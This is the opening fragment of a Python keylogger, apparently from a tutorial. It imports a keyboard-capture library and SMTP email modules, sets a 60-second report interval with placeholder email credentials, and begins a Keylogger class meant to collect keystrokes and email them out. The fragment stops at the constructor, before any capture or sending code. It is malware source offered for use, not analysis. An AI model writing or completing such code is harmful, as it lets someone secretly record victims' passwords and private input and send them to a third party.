import keyboard
import smtplib # for sending email using SMTP protocol (gmail)
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


SEND_REPORT_EVERY = 60 # in seconds
EMAIL_ADDRESS = "email@provider.tld"
EMAIL_PASSWORD = "password_here"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()